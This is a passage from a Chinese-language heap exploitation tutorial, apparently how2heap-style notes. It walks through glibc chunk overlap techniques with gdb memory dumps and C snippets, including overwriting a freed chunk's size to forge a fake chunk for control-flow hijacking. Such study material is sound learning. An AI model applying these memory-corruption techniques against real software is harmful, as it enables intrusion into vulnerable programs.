0x6032b0:       0x0000000000000000      0x0000000000000061 <-- unsortedbin
0x6032c0:       0x00007ffff7dd4b58      0x0000000000603110 <-- fk、bk
0x6032d0:       0x0000000000000000      0x0000000000000000
······
0x603310:       0x0000000000000060      0x0000000000000000
0x603320:       0x0000000000000210      0x0000000000000110
0x603330:       0x0000000000000000      0x0000000000000000 <-- chunk_c
```

然后，我们再申请一个合适大小的 chunk_d ，这样我们就有了重叠的chunk （chunk_d 以及 chunk_b2）

```
uint8_t* d;
d = malloc(0x300);
```

此时我们就可以控制chunk_b2 进行一些控制流劫持的操作了

将chunk_d染色

```c
memset(d,'D',0x300);
```

内存

```
0x603110:       0x0000000000000000      0x0000000000000321 <-- 
0x603120:       0x4444444444444444      0x4444444444444444     chunk_d
0x603130:       0x4444444444444444      0x4444444444444444     
···0x44···      省略部分
0x603200:       0x4444444444444444      0x4444444444444444
0x603210:       0x4444444444444444      0x4444444444444444
0x603220:       0x4444444444444444      0x4444444444444444 <-- b2.size
0x603230:       0x4444444444444444      0x4444444444444444 <-- chunk_b2
0x603240:       0x4444444444444444      0x4444444444444444
···0x44···      省略部分
0x6032a0:       0x4444444444444444      0x4444444444444444
0x6032b0:       0x4444444444444444      0x4444444444444444 
0x6032c0:       0x4444444444444444      0x4444444444444444 
0x6032d0:       0x4444444444444444      0x4444444444444444
···0x44···      省略部分
0x603310:       0x4444444444444444      0x4444444444444444
0x603320:       0x4444444444444444      0x4444444444444444
0x603330:       0x4444444444444444      0x4444444444444444 
0x603340:       0x4444444444444444      0x4444444444444444
······
0x603410:       0x4444444444444444      0x4444444444444444
0x603420:       0x0000000000000000      0x0000000000000000
0x603430:       0x0000000000000000      0x0000000000000111
0x603440:       0x0000000000000000      0x0000000000000000 <-- barrier
```

## overlapping_chunks

也是通过伪造块来得到重叠部分

分配三块内存

```c
intptr_t *p1,*p2,*p3;

p1 = malloc(0x100 - 8);
p2 = malloc(0x100 - 8);
p3 = malloc(0x80 - 8);
```

free掉chunk p2，进入 unsortedbin

```c
free(p2);
```

```
unsortedbin
all: 0x603100 —▸ 0x7ffff7dd4b58 (main_arena+88) ◂— 0x603100
```

对假设存在溢出点，对 chunk p2 的 chunk size 进行改写来达到构造 fake chunk 的目的

```c
int evil_chunk_size = 0x181;
int evil_region_size = 0x180 - 8;
	
*(p2-1) = evil_chunk_size;
```

构造好 fake chunk 以后再malloc（evil_chunk_size）大小的 chunk ，就会得到这个 fake chunk 了，此时 p2 与 p3 存在重叠部分